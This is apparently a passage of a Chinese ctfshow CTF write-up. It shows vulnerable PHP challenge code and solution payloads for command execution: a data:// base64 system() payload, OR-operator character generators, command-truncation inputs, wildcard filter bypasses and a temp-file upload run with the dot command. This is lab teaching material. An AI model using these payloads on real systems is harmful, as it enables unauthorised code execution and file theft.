<p>data:&#x2F;&#x2F;，类似php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p>
<p><code>?c=data://text/plain;base64,[base64_encode_shell]</code></p>
<p>看源代码，因为flag.php注释注释了flag，所以看不见，需要查看源代码也可以使用tac来读取，破坏php的注释规则，就可以直接在页面上看见flag了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 05:18:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>题解</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&lt;?php system(&#x27;cat flag.php&#x27;);?&gt;</span></span><br><span class="line">/?c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4><span id="web41">web41</span></h4><p>这个题过滤了<code>$、+、-、^、~</code>使得<strong>异或自增和取反</strong>构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符<code>|</code>。<br>我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。</p>
<p>从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成可用字符的集合</span></span><br><span class="line"><span class="comment"># rce_or.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/4/26 18:56</span></span><br><span class="line"><span class="string">    @Describe</span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="comment"># 题目的正则表达式</span></span><br><span class="line">            pattern = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span></span><br><span class="line">            <span class="comment"># 如果当前外层循环元素被过滤了，直接跳过所有内层循环</span></span><br><span class="line">            <span class="keyword">if</span> re.search(pattern, <span class="built_in">chr</span>(i)):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># 如果当前内层循环元素被过滤了，跳过该元素</span></span><br><span class="line">            <span class="keyword">if</span> re.search(pattern, <span class="built_in">chr</span>(j)):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># [2:]是因为python中hex表示是0xff这样的形式，去掉前面的0x，组成2位url编码</span></span><br><span class="line">            hex_i = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:] <span class="keyword">if</span> i &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">            hex_j = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:] <span class="keyword">if</span> j &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">            <span class="comment"># url编码的方式和ASCII码一样，但需要在前面加上%</span></span><br><span class="line">            url_i = <span class="string">&#x27;%&#x27;</span> + hex_i</span><br><span class="line">            url_j = <span class="string">&#x27;%&#x27;</span> + hex_j</span><br><span class="line">            <span class="comment"># c是我们要构造的参数，比如说我们要传ls命令，l就要拆分成a|b，其中|是因为题目没有过滤|，我们可以修改成其他任意操作</span></span><br><span class="line">            c = <span class="built_in">ord</span>(urllib.parse.unquote(url_i)) | <span class="built_in">ord</span>(urllib.parse.unquote(url_j))</span><br><span class="line">            <span class="comment"># 如果c是可见的字符</span></span><br><span class="line">            <span class="keyword">if</span> c &gt;=<span class="number">32</span> <span class="keyword">and</span> c&lt;=<span class="number">126</span>:</span><br><span class="line">                f.write(<span class="built_in">chr</span>(c)+<span class="string">&quot; &quot;</span>+url_i+<span class="string">&quot; &quot;</span>+url_j+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后输入<code>python exp.py http://403c8935-1b28-4410-8d96-512661e9649f.challenge.ctf.show/</code></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] your function：system</span><br><span class="line">[+] your command：cat flag.php</span><br></pre></td></tr></table></figure>

<p>即可获取flag</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40345591/article/details/127773706">代码解析</a>，我们也可以利用ChatGPT为我们分析代码，然后debug看看怎么运行的。</p>
<h4><span id="命令截断">命令截断</span></h4><p>我们看一眼题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 20:51:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它意思是将命令全输出到**&#x2F;dev&#x2F;null**中，同时错误信息流也会被重定向到正确信息流中。</p>
<ul>
<li><strong>Linux系统支持的管道符如下：</strong><ol>
<li>“;”：执行完前面的语句再执行后面的语句。</li>
<li>“|”：显示后面语句的执行结果。</li>
<li>“||”：当前面的语句执行出错时，执行后面的语句。</li>
<li>“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</li>
<li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li>
</ol>
</li>
</ul>
<p>这道题中我们可以用&amp;&amp;拼接，然后让后面执行的命令重定向到**&#x2F;dev&#x2F;null**中即可</p>
<ul>
<li>我们也可以用截断的方法，让后面重定向不起作用<ul>
<li>截断方法<code> ; , &amp;&amp; , %0a，||</code>等等，有很多截断方法</li>
</ul>
</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 需要url编码</span><br><span class="line">/?c=ls&amp;&amp;ls</span><br><span class="line">?c=ls;</span><br><span class="line">?c=ls%<span class="number">0</span>a</span><br><span class="line">?c=tac flag.php;</span><br><span class="line">/?c=ta\c&lt;&gt;fla\g.php%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>

<h4><span id="web54">web54</span></h4><ul>
<li><p>方法一</p>
<ul>
<li><p>屏蔽了大多数linux命令，但是我们还可以使用rev</p>
<p><code>/?c=rev$&#123;IFS&#125;fla?.php</code></p>
</li>
</ul>
</li>
<li><p>方法二</p>
<ul>
<li><p>虽然屏蔽了很多命令，但是我们只需在bin目录让命令补全就可以了</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/?<span class="built_in">at</span>$&#123;IFS&#125;f???????</span><br><span class="line">/bin/c??$&#123;IFS&#125;????????</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>方法三</p>
<ul>
<li>修改flag的名字，然后直接访问网页</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;t.txt</span><br><span class="line">t.txt</span><br></pre></td></tr></table></figure></li>
</ul>
<h4><span id="web55">web55</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>方法一</p>
<ul>
<li><p>这题禁用了 字母 a-z ，那么我可以用 &#x2F;bin&#x2F;base64 flag.php</p>
<p>加上通配符 则为 &#x2F;???&#x2F;????64 ????.??? 然后他就会出现 flag.php内容的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=base64%E7%BC%96%E7%A0%81&spm=1001.2101.3001.7020">base64编码</a></p>
</li>
</ul>
</li>
<li><p>方法二：</p>
<ul>
<li><p>还有一种做法，就是使用 &#x2F;usr&#x2F;bin&#x2F;bzip2 进行对文件的压缩</p>
<p>同样是使用通配符进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=payload&spm=1001.2101.3001.7020">payload</a>， 然后 最后访问 &#x2F;flag.php.bz2进行下载压缩包</p>
<p><code>?c=/???/???/????2%20????.???</code></p>
</li>
</ul>
</li>
<li><p>方法三：</p>
<p>前提是 题目没有过滤 ? &#x2F; . (问号，斜杠,点)，就可以使用这个方法进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=RCE&spm=1001.2101.3001.7020">RCE</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell</a></p>
<p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png" alt="glob通配符"></p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://43546a81-d8c7-4242-a8ea-dde142ff1d80.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>本地访问并<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">抓包</a>，上传1.php 写入</p>
<p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/c51ed151f2784287b539732dd5ff2699.png" alt="burpsuit"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST /?c=.%<span class="number">20</span>/???/????????[@-[] HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">6</span>fcec0ba-d4db-<span class="number">470</span>e-b611-<span class="number">1</span>f5455fea91c.challenge.ctf.show</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">319</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">sec-ch-ua: <span class="string">&quot;.Not/A)Brand&quot;</span>;v=<span class="string">&quot;99&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;103&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;103&quot;</span></span><br><span class="line">sec-ch-ua-mobile: ?<span class="number">0</span></span><br><span class="line">sec-ch-ua-platform: <span class="string">&quot;macOS&quot;</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: <span class="literal">null</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaq9iIs9BT90tIPe6</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10_15_7</span>) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: cross-site</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryaq9iIs9BT90tIPe6</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span></span><br><span class="line"><span class="comment">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">##/bin/sh</span></span><br><span class="line"><span class="comment">cat flag.php.bz2</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryaq9iIs9BT90tIPe6</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">æäº¤</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryaq9iIs9BT90tIPe6--</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##/bin/sh</span></span><br><span class="line">cat  /<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line"><span class="comment"># 因为上传的文件在tmp目录下</span></span><br></pre></td></tr></table></figure>

<p>这个目录是&#x2F;tmp，然后一般网页文件会命名为php??????，后面是随机的字母。所以我们需要规定一个范围[@-[],从@-[就是26个字母</p>
<p>然后关于上传文件的内容。既然要让我们上传的文件能执行我们的内容，所以我们添加内容&#x2F;bin&#x2F;sh</p>
<p>因为linux系统下一切皆文件，所以一些个内置程序都是由文件组成的。</p>
<p>&#x2F;bin目录下存放的都是协议shell脚本的内容，sh就是执行shell脚本，我们可以理解为打开终端。只有打开终端我们再能输入命令对吧</p>
<p>然后我们就可以在文件里面在添加ls,cat等一系列读取文件的命令了。</p>
<p>那么还差最后一步。我们上传了这个文件后那么它是存放在&#x2F;tmp目录下的某一个文件，但是它只是存放在了那里，并不会被执行。</p>
<p>这时候我们可以时候点命令，而正好题目并没有过滤点命令，点命令就是执行shell脚本</p>
<p>所以我们抓包，然后构造</p>
<p><strong>有概率失败，失败重试即可，因为最后一个字母不一定是大写的，记得修改右上角的port为80，然后https关了</strong></p>
<h4><span id="web57">web57</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span 